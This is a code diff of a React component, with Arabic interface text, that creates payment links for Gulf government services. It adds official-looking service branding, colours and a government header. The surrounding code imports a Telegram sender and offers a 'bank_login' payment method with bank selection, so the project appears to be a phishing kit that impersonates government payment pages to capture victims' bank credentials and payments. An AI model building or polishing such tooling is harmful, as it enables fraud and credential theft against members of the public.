@@ -12,6 +12,7 @@ import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { generatePaymentLink } from "@/utils/paymentLinks";
+import { getServiceBranding } from "@/lib/serviceLogos";
 import { Building2, DollarSign, Hash, Copy, ExternalLink, CreditCard, User, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -49,6 +50,18 @@ const CreateGovernmentLink = () => {
     services.find(s => s.key === selectedService),
     [services, selectedService]
   );
+
+  const serviceBranding = useMemo(() => 
+    selectedService ? getServiceBranding(selectedService) : getServiceBranding('mol'),
+    [selectedService]
+  );
+
+  const governmentTheme = {
+    primary: serviceBranding.colors.primary,
+    secondary: serviceBranding.colors.secondary,
+    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
+    bgLight: "#f0f9ff"
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -134,49 +147,57 @@ const CreateGovernmentLink = () => {
 
   if (!countryData) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+      <div className="min-h-screen flex items-center justify-center" dir="rtl" style={{ background: governmentTheme.bgLight }}>
         <div className="text-center p-8">
-          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
+          <Building2 className="w-16 h-16 mx-auto mb-4" style={{ color: governmentTheme.primary }} />
+          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
           <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
+          <Button onClick={() => navigate('/services')} style={{ background: governmentTheme.gradient }}>
+            العودة للخدمات
+          </Button>
         </div>
       </div>
     );
   }
   
   return (
-    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
+    <div className="min-h-screen py-4" dir="rtl" style={{ background: `linear-gradient(to bottom, ${governmentTheme.bgLight}, white)` }}>
       <div className="container mx-auto px-4">
         <div className="max-w-2xl mx-auto">
-          <Card className="p-4 shadow-elevated">
+          <Card className="p-4 shadow-xl border-2" style={{ borderColor: `${governmentTheme.primary}20` }}>
             <div
-              className="h-16 -m-4 mb-4 rounded-t-xl relative"
-              style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-              }}
+              className="h-20 -m-4 mb-4 rounded-t-xl relative overflow-hidden"
+              style={{ background: governmentTheme.gradient }}
             >
-              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
-              <div className="absolute bottom-2 right-4 text-white">
-                <h1 className="text-lg font-bold">إنشاء رابط دفع - خدمات حكومية</h1>
-                <p className="text-xs opacity-90">{countryData.nameAr}</p>
+              <div className="absolute inset-0 bg-black/10" />
+              <div className="absolute inset-0 flex items-center justify-between px-6">
+                <div className="text-white">
+                  <div className="flex items-center gap-2 mb-1">
+                    <Building2 className="w-6 h-6" />
+                    <h1 className="text-xl font-bold">الخدمات الحكومية</h1>
+                  </div>
+                  <p className="text-sm opacity-90">إنشاء رابط دفع للخدمات الحكومية - {countryData.nameAr}</p>
+                </div>
+                <div className="text-4xl">🏛️</div>
               </div>
             </div>
             
             <form onSubmit={handleSubmit} className="space-y-4">
               {/* Service Selection */}
               <div>
-                <Label className="mb-2 text-sm">الخدمة الحكومية *</Label>
+                <Label className="mb-2 text-sm font-semibold" style={{ color: governmentTheme.primary }}>
+                  الخدمة الحكومية *
+                </Label>
                 <Select value={selectedService} onValueChange={setSelectedService}>
-                  <SelectTrigger className="h-10">
+                  <SelectTrigger className="h-11 border-2" style={{ borderColor: `${governmentTheme.primary}30` }}>
                     <SelectValue placeholder="اختر الخدمة الحكومية" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
                     {services.map((service) => (
                       <SelectItem key={service.id} value={service.key}>
                         <div className="flex items-center gap-2">
+                          <Building2 className="w-4 h-4" style={{ color: governmentTheme.primary }} />
                           <span>{service.nameAr}</span>
-                          <span className="text-xs text-muted-foreground">({service.category})</span>
                         </div>
                       </SelectItem>
                     ))}
@@ -186,9 +207,12 @@ const CreateGovernmentLink = () => {
               
               {/* Service Description */}
               {selectedService && selectedServiceData && (
-                <div className="p-3 rounded-lg border border-border bg-card/50">
+                <div className="p-3 rounded-lg border-2" style={{ 
+                  borderColor: `${governmentTheme.primary}30`,
+                  background: governmentTheme.bgLight
+                }}>
                   <div className="flex items-center gap-2 mb-2">
-                    <Building2 className="w-4 h-4 text-primary" />
+                    <Building2 className="w-4 h-4" style={{ color: governmentTheme.primary }} />
                     <h3 className="font-semibold text-sm">{selectedServiceData.nameAr}</h3>
                   </div>
                   {selectedServiceData.description && (
@@ -200,14 +224,15 @@ const CreateGovernmentLink = () => {
               {/* Reference Number */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <Hash className="w-3 h-3" />
+                  <Hash className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                   رقم الطلب أو المعاملة *
                 </Label>
                 <Input
                   value={referenceNumber}
                   onChange={(e) => setReferenceNumber(e.target.value)}
                   placeholder="مثال: REF-2024-001"
-                  className="h-9 text-sm"
+                  className="h-10 text-sm border-2"
+                  style={{ borderColor: `${governmentTheme.primary}20` }}
                   required
                 />
               </div>
@@ -215,14 +240,15 @@ const CreateGovernmentLink = () => {
               {/* Applicant Name */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <User className="w-3 h-3" />
+                  <User className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                   اسم مقدم الطلب *
                 </Label>
                 <Input
                   value={applicantName}
                   onChange={(e) => setApplicantName(e.target.value)}
                   placeholder="الاسم الكامل"
-                  className="h-9 text-sm"
+                  className="h-10 text-sm border-2"
+                  style={{ borderColor: `${governmentTheme.primary}20` }}
                   required
                 />
               </div>
@@ -230,35 +256,37 @@ const CreateGovernmentLink = () => {
               {/* Applicant ID */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <FileText className="w-3 h-3" />
+                  <FileText className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                   رقم الهوية / الإقامة
                 </Label>
                 <Input
                   value={applicantId}
                   onChange={(e) => setApplicantId(e.target.value)}
                   placeholder="رقم الهوية أو الإقامة"
-                  className="h-9 text-sm"
+                  className="h-10 text-sm border-2"
+                  style={{ borderColor: `${governmentTheme.primary}20` }}
                 />
               </div>
               
               {/* Service Description */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <FileText className="w-3 h-3" />
+                  <FileText className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                   وصف الخدمة أو التفاصيل
                 </Label>
                 <Textarea
                   value={serviceDescription}
                   onChange={(e) => setServiceDescription(e.target.value)}
                   placeholder="أدخل تفاصيل إضافية عن الخدمة"
-                  className="text-sm min-h-[80px]"
+                  className="text-sm min-h-[80px] border-2"
+                  style={{ borderColor: `${governmentTheme.primary}20` }}
                 />
               </div>
               
               {/* Fee Amount */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <DollarSign className="w-3 h-3" />
+                  <DollarSign className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                   رسوم الخدمة
                   {country && (
                     <span className="text-xs text-muted-foreground">
@@ -271,7 +299,8 @@ const CreateGovernmentLink = () => {
                   value={feeAmount}
                   onChange={(e) => setFeeAmount(e.target.value)}
                   placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
-                  className="h-9 text-sm"
+                  className="h-10 text-sm font-semibold border-2"
+                  style={{ borderColor: `${governmentTheme.primary}20` }}
                   step="0.01"
                   min="0"
                 />
@@ -285,11 +314,11 @@ const CreateGovernmentLink = () => {
               {/* Payment Method Selection */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <CreditCard className="w-3 h-3" />
+                  <CreditCard className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                   طريقة الدفع *
                 </Label>
                 <Select value={paymentMethod} onValueChange={setPaymentMethod}>
-                  <SelectTrigger className="h-10">
+                  <SelectTrigger className="h-10 border-2" style={{ borderColor: `${governmentTheme.primary}30` }}>
                     <SelectValue placeholder="اختر طريقة الدفع" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
@@ -318,11 +347,11 @@ const CreateGovernmentLink = () => {
               {paymentMethod === "bank_login" && (
                 <div>
                   <Label className="mb-2 flex items-center gap-2 text-sm">
-                    <Building2 className="w-3 h-3" />
+                    <Building2 className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                     اختر البنك *
                   </Label>
                   <Select value={selectedBank} onValueChange={setSelectedBank}>
-                    <SelectTrigger className="h-10">
+                    <SelectTrigger className="h-10 border-2" style={{ borderColor: `${governmentTheme.primary}30` }}>
                       <SelectValue placeholder="اختر البنك" />
                     </SelectTrigger>
                     <SelectContent className="bg-background z-50">
@@ -352,7 +381,8 @@ const CreateGovernmentLink = () => {
               {/* Submit Button */}
               <Button
                 type="submit"
-                className="w-full py-5"
+                className="w-full py-5 text-white"
+                style={{ background: governmentTheme.gradient }}
                 disabled={createLink.isPending}
               >
                 {createLink.isPending ? (
